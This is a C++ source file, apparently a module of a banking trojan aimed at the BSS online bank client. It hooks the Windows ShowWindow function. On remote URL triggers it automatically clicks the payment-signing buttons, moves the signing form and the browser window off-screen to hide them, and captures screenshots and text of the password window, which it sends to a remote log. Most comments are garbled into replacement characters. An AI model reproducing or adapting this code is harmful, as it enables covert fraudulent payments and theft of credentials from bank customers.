

#include "bsssign.h"
#include "Memory.h"
#include "GetApi.h"
#include "Splice.h"
#include "Strings.h"
#include "Utils.h"
#include "Unhook.h"
#include "WndUtils.h"
#include "ScreenShots.h"
#include "Loader.h"


#include "BotDebug.h"

namespace bsssign_Template
{
    #include "DbgTemplates.h"
}
#define BDBG  bsssign_Template::DBGOutMessage<>



//***********************************************************************
//  ���������� ������ BSSSign
//***********************************************************************
namespace BSSSign
{


	// ������ ��������� ����������� ���� �������
    #define LOG_BSS_SIGN

	// ���������� ���������� ���������� ����� �������� ����
	#if  !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
    	#define BSS_HIDE_WND
	#endif

	// ��� ����� ������ ����� ������������
	#define HASH_SIGN_FORM_CLASS 0xF8047238 /* obj_Form */

	// ��� ��������� ���� ������������ �����
	#define HASH_SIGN_FORM_CAPTION 0x4DFAF875 /* ������� */

	// ��� ��������� ������� ��������
    #define HASH_BUTTON_CLASS 0xB84059EC /* obj_BUTTON */

	// ��������� ������ ������� ��������
    DWORD HASH_SIGN_BUTTON_CAPTION = 0xBE1A55FD; /* ��������� */

	// ��������� ������ ��������
	DWORD HASH_CLOSE_BUTTON_CAPTION = 0xAE1E1985; /* ������� */

	// ��� ����� ������ �������� ����������
    #define HASH_IE_SERVER 0xF5E7484A /* Internet Explorer_Server */

    char ButtonClassName[] = {'o','b','j','_','B','U','T','T','O','N', 0};
    char ButtonCaption[]   = {'�','�','�','�','�','�','�','�','�', 0};
	//----------------------------------------------------

	typedef BOOL (WINAPI *TShowWindow)(HWND hWnd, int Cmd);

	TShowWindow  Real_ShowWindow;


	bool Active = false; // ���������� ������� �������
	bool Blind  = false; // ������������ �����
	bool Move   = false; // ������� ����
	bool SignState = false; // ������� ����, ��� � ������ ������ ��� �������
	HWND PasswordForm = NULL;
	RECT WindowRect;


	// ������� ������ ����������� ����
	void SetHooks();

	// ��� ����������� ����
	BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd);

	// ������� ����������� �����
	DWORD WINAPI SignPayment(LPVOID Data);


	void DoMoveWindow(HWND Wnd, int x, int y);

	// ������ ��������� ����������� ����
	#ifdef LOG_BSS_SIGN
		char LogTypeBSSSign[] = {'B','S','S','S','i','g','n', 0};
		char LogTypeBSSSignUnknown[] = {'B','S','S','S','i','g','n','_','U','n','k','n','o','w','n','_','W','n','d', 0};
		char LogTypeBSSSignError[] = {'B','S','S','S','i','g','n','_','E','r','r','o','r', 0};

		typedef struct TLog
		{
        	PCHAR Type;
			PCHAR Text;
			LPBYTE Screen;
			DWORD ScreenSize;
			HWND Wnd;
		} *PLog;


		DWORD WINAPI SendLogAndDeleteData(LPVOID BSSLog);

	#endif
}

//***********************************************************************


#ifdef LOG_BSS_SIGN

	DWORD WINAPI BSSSign::SendLogAndDeleteData(LPVOID BSSLog)
	{
		// ������� ���������� ��� �� �������� ���������� ��������
		PLog Log = (PLog)BSSLog;

		if( Log->Wnd )
		{
			Sleep(1000);
			ScreenShot::MakeToMem(Log->Wnd, 0, 0, 0, 0, NULL, Log->Screen, Log->ScreenSize);
		}

		PCHAR Type = (!STR::IsEmpty(Log->Type)) ? Log->Type : LogTypeBSSSign;

		SendRemoteLog(Type, Log->Text, Log->Screen, Log->ScreenSize, NULL);

		STR::Free(Log->Type);
		STR::Free(Log->Text);
		MemFree(Log->Screen);

		FreeStruct(Log);
		return 0;
	}

#endif


void BSSSign::DoMoveWindow(HWND Wnd, int x, int y)
{
	RECT R;
	if (!pGetWindowRect(Wnd, &R))
		return;

	int W = R.right - R.left;
    int H = R.bottom - R.top;


	pMoveWindow(Wnd, x, y, W, H, FALSE);
}
//----------------------------------------------------------------------------


void BSSSignDoClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash, DWORD &Count)
{
	// ���������� �������� ���� ������������ ������ � ���������
	HWND Button = NULL;
	do
	{
		Button = (HWND)pFindWindowExA(Form, Button, BSSSign::ButtonClassName, NULL);

		if (Button == NULL) break;

		PCHAR Caption = GetWndText(Button);
		DWORD Hash = CalcHash(Caption);
		STR::Free(Caption);

		// ��������� ��������� ������
		if (Hash != BtnCaptionHash)
		{
			BSSSignDoClickToButtons(Button, MultiClick, BtnCaptionHash, Count);
			if (Count != 0 && !MultiClick) return;
			continue;
		}

		// ������� �� ������
		pSleep(100);
	
		if (HardClickToWindow(Button, 5, 5))
		{
			Count++;
			if (!MultiClick) return;
        }
	}
	while (true);

}
//----------------------------------------------------------------------------
void WaitPasswordWnd(HWND Wnd)
{
	// ������ ������� ���� ��������� ���� ����� ������.
	// ����� ������ ��� ������� �������� ���� ���, ��
	// ����� ������ ��� "�� �������"

	BYTE i = 1;
	while ((BOOL)pIsWindowVisible(Wnd))
	{
		pSleep(1000);
		i++;

		if (i > 30) return;
    }
		
}

//----------------------------------------------------------------------------

DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
{
	// ������� ����������� �����
	HWND Form = (HWND)Data;
	if (Form == NULL) return 0;


	pSleep(1000);

	SignState = true;
	PasswordForm = NULL;
	BDBG("bsssign","������� �� ������� �������");

	// ������� �� ������� ��������� �������
	DWORD Count = 0;
	BSSSignDoClickToButtons(Form, true, BSSSign::HASH_SIGN_BUTTON_CAPTION, Count);


	// ��� ������������� ������� �������� ���� ����� ������
	if (BSSSign::PasswordForm != NULL)
		WaitPasswordWnd(BSSSign::PasswordForm);

	// ������� �� ������� �������� ����
	pSleep(1000);
	if (pIsWindowVisible(Form))
	{
		DWORD Closed = 0;
		BSSSignDoClickToButtons(Form, false, BSSSign::HASH_CLOSE_BUTTON_CAPTION, Closed);
	}

	// ������� �������� ���� ����������
	BOOL Visible = true;

	for (int i = 0; i < 10; i++)
	{
		pSleep(1000);
		Visible = (BOOL)pIsWindowVisible(Form);
		if (!Visible)
        	break;
	}
	

	// � ������ ���� ���� �� ��������� �� ������� ������ ��������
	// ��������� �������� ����
	if (Visible)
	{
		#ifdef LOG_BSS_SIGN
			// ���������� �����
			PLog Log = CreateStruct(TLog);
			if (Visible)
				Log->Type = STR::New(LogTypeBSSSignError);
			Log->Text = GetAllWindowsText(Form, true, true);

			SendLogAndDeleteData(Log);
		#endif

		pSendMessageW(Form, WM_CLOSE, 0, 0);
	}



    BDBG("bsssign","������� ���������. ������ ������ %d", Count);


    SignState = false;

	return 0;
}
//----------------------------------------------------------------------------

bool IsPasswordForm(HWND Wnd)
{
	// ������� ���������� ������ ����, ���� Wnd �������� �����
	// ����� ������


	// ���� ������: ���� ������ ���� ��������, �� ����� ��������.
	if (pGetParent(Wnd) != NULL)
		return false;

	// ���� ������� ���������� ������ :)

/* TODO :
��� ��������� �������������� ������ �� ���� ����� ������
������������ ���������� ���������� ����. */
	return true;
}

//----------------------------------------------------------------------------
BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
{

	if ((Cmd != SW_SHOW) || (!Active && !Blind))
    	return Real_ShowWindow(Wnd, Cmd);

    // �������� ���� �� �����, ��������� ����
    bool StartSign = false;
	PCHAR ClassName = GetWndClassName(Wnd);
    DWORD CNHash    = CalcHash(ClassName);

	#ifdef DebugUtils
	if (Cmd == SW_SHOW)
	{
		PCHAR Caption = GetWndText(Wnd);
		BDBG("bsssign", "������������ ���� %s", Caption);
		STR::Free(Caption);
	}
	#endif

	if(Active)
	{
		// ��������� ����������� ���� ������������ ��������

		if (CNHash == HASH_SIGN_FORM_CLASS)
		{
			PCHAR Caption = GetWndText(Wnd);
			DWORD CaptionHash = CalcHash(Caption);

			if (CaptionHash == HASH_SIGN_FORM_CAPTION)
			{
				BDBG("bsssign","��������� ������� ����������");
				StartSign = true;
			}

			STR::Free(Caption);
        }
	}
	if(Blind)
	{
//		if (CNHash == HASH_IE_SERVER)
//		{
//			CNHash == CNHash;
//        }
//		if ( plstrcmpW(ClasN, ) )
//		{
//			HWND Wnd = (HWND)pGetParent((HWND)pGetParent(hWnd));
//			HWND ShellObj = (HWND)FindWindowExA(Wnd, NULL,"Shell DocObject View",NULL);
//			HWND hWndIn = (HWND)pFindWindowExA(ShellObj, NULL,
//
//			WCHAR ClasName[MAX_PATH];
//
//			pGetClassNameW(hWndIn,ClasName,MAX_PATH);
//
//			if (! plstrcmpW(ClasName,L"Internet Explorer_Server") )
//			{
//				Real_ShowWindow(hWndIn, SW_HIDE);
//				Cmd = SW_HIDE;
//			}
//		}
	}

    STR::Free(ClassName);

	
	BOOL Result = Real_ShowWindow(Wnd, Cmd);


	if (StartSign)
	{
		// ��������� ����� �������
		#ifdef BSS_HIDE_WND
			BSSSign::DoMoveWindow(Wnd, -1000, 0);
			// ��� ������� �� ������ ����
			//SetWindowTransparent(Wnd, 1);
		#endif

  		StartThread(SignPayment, Wnd);
	}
	else
	if (SignState && IsPasswordForm(Wnd))
	{
		// ��� ������� ��������� ������������ ����
		// ������ �����
		PasswordForm = Wnd;

		#ifdef LOG_BSS_SIGN
			// � ������ ���� �� ����� ������� ������������ ����������� ����
			// �� ��������� � ���������� ���
			PLog Log  = CreateStruct(TLog);
			Log->Wnd  = Wnd;
			Log->Type = STR::New(LogTypeBSSSignUnknown);
			Log->Text = GetAllWindowsText(Wnd, true, true);

			StartThread(SendLogAndDeleteData, Log);
		#endif
	}

	return Result;
}
//----------------------------------------------------------------------------


BOOL CALLBACK EnumWindowsIE( HWND hWnd, LPARAM lParam )
{
	//���������� ��� ���� � ����� �� ������ � ��� ������� ����Internet Explorer_Server
	WCHAR ClasN[MAX_PATH];
	
	
	pGetClassNameW(hWnd,ClasN, MAX_PATH);

	if (!plstrcmpW(ClasN,L"IEFrame"))
	{
		BDBG("bsssign","������� IEFrame");
		HWND Wnd = (HWND)pFindWindowExA(hWnd,NULL,"Frame Tab",NULL);
	
		HWND Wnd1 = (HWND)pFindWindowExA(Wnd,NULL,"TabWindowClass",NULL);


		HWND hWndIn = (HWND)pFindWindowExA(
					  (HWND)pFindWindowExA(Wnd1,NULL,"Shell DocObject View",NULL)
										,
										NULL,
										"Internet Explorer_Server",
										NULL);
		
		pShowWindow(hWndIn, SW_SHOW);
		return FALSE;
	}
	return TRUE;
}
//-----------------------------------------------------------------------------

void BSSSign::CheckRequest(PCHAR URL)
{
	//  ������� ��������� ������ �� �������
	//  ����� ������� �� ������� ������� � ��
	//  ������� ����������

	if (STR::IsEmpty(URL))
		return;


	if ( CompareUrl( "*az_start", URL ) )
	{
		Active = true;
		BDBG("bsssign","��������� �����������");

	}
	else
	if ( CompareUrl( "*az_stop", URL ) )
	{
		BDBG("bsssign","������������� ���������");
		Active = false;
	}
	else
	if ( CompareUrl( "*blind_up", URL ) )
	{
				
		BDBG("bsssign","Blind=true; ������ ������ ������� ���� ��");
		Blind = true;
	}
	else
	if ( CompareUrl( "*blind_down", URL ) )
	{
		BDBG("bsssign","���������� ��������� ����");
		pEnumWindows((WNDENUMPROC)EnumWindowsIE, NULL);

		Blind = false;
	}
	else if ((CompareUrl( "*move_up", URL)) && (!Move))
	{

		BDBG("bsssign","���� �� � �����");
		HWND Wind = (HWND)pFindWindowA("IEFrame", NULL);
		pGetWindowRect(Wind,&WindowRect);
		int x =(int)pGetSystemMetrics( SM_CXSCREEN );
		int y =(int)pGetSystemMetrics( SM_CYSCREEN );

		BDBG("bsssign","���� �� � ����� %d",x);
		BDBG("bsssign","���� �� � ����� %d",y);
		pMoveWindow(Wind,x,0,WindowRect.right-WindowRect.left,WindowRect.bottom-WindowRect.top,FALSE);

		Move=true;
	}
	else
	if (( CompareUrl( "*move_down", URL ) )&&(Move))
	{
		BDBG("bsssign","���� �� �� �����");
		HWND Wind = (HWND)pFindWindowA("IEFrame",NULL);
		pMoveWindow(Wind,WindowRect.left ,WindowRect.top ,WindowRect.right-WindowRect.left,WindowRect.bottom - WindowRect.top,TRUE);
			
		Move = false;
	}
}

//-----------------------------------------------------------------------------

void BSSSign::SetHooks()
{
	//UnhookShowWindow();
	if ( HookApi( 3, 0x7506E960, Hook_ShowWindow) )
	{
		__asm mov [Real_ShowWindow], eax
	}

}
//-----------------------------------------------------------------------------

void BSSSign::Initialize()
{
	// ������� �������������� ������� ������� BSS

	Active = false;
	Blind  = false;
	Move   = false;
	SignState = false;

	SetHooks();
}


